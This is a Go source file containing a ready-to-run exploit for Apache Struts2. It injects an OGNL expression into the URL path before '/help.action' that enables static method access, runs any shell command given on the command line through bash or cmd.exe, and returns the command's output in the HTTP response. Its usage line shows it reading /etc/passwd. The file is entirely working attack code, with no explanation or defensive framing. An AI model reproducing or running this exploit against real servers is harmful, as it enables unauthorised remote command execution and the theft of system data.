package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main() {

	if len(os.Args) < 3 {
		fmt.Println("Usage: ./exploit URL CMD \n Ex: ./exploit http://localhost:8080 \"cat /etc/passwd\"")
		os.Exit(0)
	}

	payload := "${"
	payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
	payload += "(#cmd='" + os.Args[2] + "')."
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
	payload += "(#p.redirectErrorStream(true))."
	payload += "(#process=#p.start())."
	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	payload += "(#ros.flush())"
	payload += "}"

	client := &http.Client{}

	encodedPayload := strings.Replace(url.QueryEscape(payload), "%2F", "/", -1)
	encodedPayload = strings.Replace(encodedPayload, "+", "%20", -1)

	url := os.Args[1] + "/" + encodedPayload + "/help.action"

	resp, err := client.Get(url)

	if err != nil {
		fmt.Println(err)
	}

	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	fmt.Println(string(bodyBytes))
}
